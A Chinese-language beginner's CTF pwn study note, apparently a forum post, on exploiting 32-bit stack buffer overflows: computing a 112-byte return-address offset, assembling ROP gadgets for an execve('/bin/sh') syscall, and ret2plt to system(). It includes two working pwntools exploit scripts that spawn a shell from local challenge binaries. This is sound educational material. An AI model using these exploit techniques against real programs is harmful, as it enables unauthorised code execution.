
# [原创][新手向]Pwn学习笔记：CTF pwn题解题套路实战

## 解题套路

1. 检查保护情况
2. 判断漏洞函数，如`gets`,`scanf`等
3. 计算目标变量的在堆栈中距离`ebp`的偏移
4. 分析是否已经载入了可以利用的函数，如`system`，`execve`等
5. 分析是否有字符串`/bin/sh`

### Pwn1

这道题包含了一个可以直接利用的可以返回shell的函数，现在的任务就是计算偏移，然后将shell函数的地址覆盖到相应的位置上就可以利用成功。

首先来查看一下该程序的保护情况，发现开启了堆栈保护（`NX`），是一个32bit的程序，因此需要在32位的linux环境下测试。

![](upload/attach/202002/823237_HJ4ZE45TMW5A5F2.png)

![](upload/attach/202002/823237_NGPQMWMWBW7NYBB.png)

用`IDA`查看程序源码

![](upload/attach/202002/823237_F38JSXZ6KE36VH4.png)

可以明显看到漏洞是在`gets`里面，`gets`接收输入存在缓冲区溢出漏洞，可以通过超长字符串溢出来利用此漏洞。

为了可以利用此漏洞，我们需要先计算输入的字符串的堆栈地址距离栈底`ebp`的位置，`ebp`的下一个地址就是返回地址的位置，在32位程序中是`ebp+4`。

由两种方法可以得到字符串距离返回地址的距离：1.手工计算；2.利用 `pattern offset`计算

先说手工计算：利用`gdb`的插件`gef`可以查找`esp`的地址，`gdb`附加程序，然后在`gets`函数位置下断点：`b 0x080486AE`

![](upload/attach/202002/823237_2BQ8E89TS6SGSWR.png)

可以看到`esp`的地址是`0xbfffeed0`，`ebp`地址是`0xbfffef58`，字符串（`eax`）相对于 `esp` 的索引为[`esp+80h-64h`]= [`esp+0x1c`]，字符串的地址是`0xbfffeeec`，所以字符串相对于 `ebp` 的偏移为 `0x6C`（108），相对于返回地址的偏移为 `0x6c+4`（112）。

![](upload/attach/202002/823237_ZYVPERP749P3BDC.png)

另一种方法是用工具`pattern offset`来计算，直接下载就可以，<mark class="encrypted">959K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4y4%4L8%4u0V1i4K6u0r3M7$3S2W2L8r3I4U0L8$3c8W2i4K6g2X3N6r3!0G2L8s2x3`.</mark>

### Pwn2

这里没有可以直接利用的`system()`函数，现在就只能使用系统调用来操作了，`Syscall`函数的调用规范是：`execve`（“`bin/sh`”，0,0）

对应的汇编代码是：

```
pop eax, # 系统调用号载入， execve为0xb
pop ebx, # 第一个参数， /bin/sh的string
pop ecx, # 第二个参数，0
pop edx, # 第三个参数，0
int 0x80, # 执行系统调用
```

需要我们人工构造去控制`eax`，`ebx`，`ecx`，`edx`；使用`Ropgadget`工具

针对`edx`，选择，`0x0806eb6a : pop edx ; ret`

![](upload/attach/202002/823237_6MZVTBR3WBGP8ZT.png)

执行命令，筛选`int 0x80`的系统调用, 选择：`0x08049421`

![](upload/attach/202002/823237_GHV2HNGHEMK8AXX.png)

执行命令，筛选字符串，得到：`0x080be408`

![](upload/attach/202002/823237_AYHF8CTDQQHKF5G.png)

这里选择每个`gadget`都含有`ret`指令是为了使程序自动连续选择堆栈中的指令去执行，在构造这些`gadgets`之前，先分析一下`eip`的执行流程，`ret`指令可以理解成到栈顶的指令下次去跳转的位置

![](upload/attach/202002/823237_XKP4VTMQGXV2P4Q.png)

上图来自`desword`所画，主要为了学习，执行完上面的指令就会调用 `execve("/bin/sh", 0,0)`系统调用，左边是堆栈，右边是对应的代码，数字表示运行到特定的汇编指令的时候，`esp`指针的位置，通过`pop`指令移动`esp`获取数据，通过`ret`指令移动`esp`获取下一条要执行的命令，这样就可以控制程序执行流程了。

```
pop eax, # 系统调用号载入， execve为0xb
pop ebx, # 第一个参数， /bin/sh的string
pop ecx, # 第二个参数，0
pop edx, # 第三个参数，0
int 0x80, # 执行系统调用
```

最后的exp

```python
#!/usr/bin/env python
from pwn import *
sh = process('./pwn2')
pop_eax_ret = 0x080bb196
pop_ecx_ebx_ret = 0x0806eb91
pop_edx_ret = 0x0806eb6a
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
['A' * 112, pop_eax_ret, 0xb, pop_ecx_ebx_ret, 0,binsh, pop_edx_ret,0, int_0x80])
sh.sendline(payload)
sh.interactive()
```

![](upload/attach/202002/823237_TDKYB6S8TK2SCTC.png)

构造`shellcode`

```python
#!/usr/bin/env python
from pwn import *
sh = process('./pwn3')
system_plt = 0x08048460
sh_addr = 0x8048720
payload = flat(['a' * 112, system_plt, 0xabcdabcd, sh_addr])
sh.sendline(payload)
sh.interactive()
```

填充`0xabcdabcd`是因为，在正常调用`system`函数的时候，堆栈位置的`system_plt`之后的内容为`system`函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在`system_plt`和`sh_addr`之间增加了4个字符来进行填充

这里简单整理一下步骤（假设linux程序在虚拟机`guest`执行，`IDA`在主机`host`执行）：

1. 拷贝`linux_server`到`guest`的程序目录，并执行；
2. `IDA`设置远程调试，并设置正确的`guest IP`和端口；
3. `IDA`设置程序的断点在`return`，可以方便查看寄存器；
4. 运行程序；
5. 用脚本`patternLocOffset.py`创建偏移测试字符串，700字节度比如；
6. 将产生的字符串在`guest`中输入；
7. 查看`host`中`IDA`的`ebp`字符串；
8. 在`patternLocOffset.py`中计算偏移
